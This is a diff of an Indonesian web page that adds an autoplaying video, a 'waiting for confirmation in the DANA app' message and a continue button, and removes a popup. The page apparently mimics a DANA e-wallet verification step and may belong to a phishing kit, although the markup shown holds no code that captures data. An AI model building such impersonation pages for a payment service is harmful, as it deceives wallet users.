@@ -1,16 +1,17 @@
-<!-- success.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
 
 <meta charset="UTF-8">
 
-<meta name="viewport"
+<meta
+name="viewport"
 content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <title>Konfirmasi</title>
 
-<link rel="stylesheet"
+<link
+rel="stylesheet"
 href="success.css">
 
 </head>
@@ -27,14 +28,55 @@ href="success.css">
 
     </div>
 
-    <!-- FOTO -->
+    <!-- VIDEO CARD -->
     <div class="card photo-card">
 
-        <img
-        src="assets/verifikasii.png"
-        class="photo">
+        <!-- TEKS ATAS VIDEO -->
+        <div class="video-overlay">
+
+            <div class="video-text">
+                Menunggu Konfirmasi di Aplikasi DANA
+            </div>
+
+            <!-- TITIK LOADING -->
+            <div class="dots-loading">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+        </div>
+
+        <!-- VIDEO -->
+        <video
+        class="photo-video"
+        autoplay
+        muted
+        loop
+        playsinline>
+
+            <source
+            src="assets/verifikasi.mp4"
+            type="video/mp4">
+
+        </video>
 
     </div>
+
+    <!-- TEKS PETUNJUK -->
+    <div class="verify-text">
+        Jika sudah di verifikasi silahkan klik
+    </div>
+
+    <!-- BUTTON -->
+    <button
+    type="button"
+    class="btn-lanjut"
+    id="btnLanjut">
+
+        LANJUTKAN
+
+    </button>
 
 </div>
 
@@ -59,34 +101,7 @@ id="notifOverlay">
 </div>
 
 <!-- ========================= -->
-<!-- POPUP 1 -->
-<!-- ========================= -->
-
-<div
-class="popup-overlay"
-id="popupOverlay">
-
-    <div class="popup-box">
-
-        <img
-        src="assets/popup-lanjut.png"
-        class="popup-img">
-
-        <button
-        type="button"
-        class="btn"
-        id="lanjutBtn">
-
-            LANJUTKAN
-
-        </button>
-
-    </div>
-
-</div>
-
-<!-- ========================= -->
-<!-- POPUP 2 -->
+<!-- POPUP YA/TIDAK -->
 <!-- ========================= -->
 
 <div
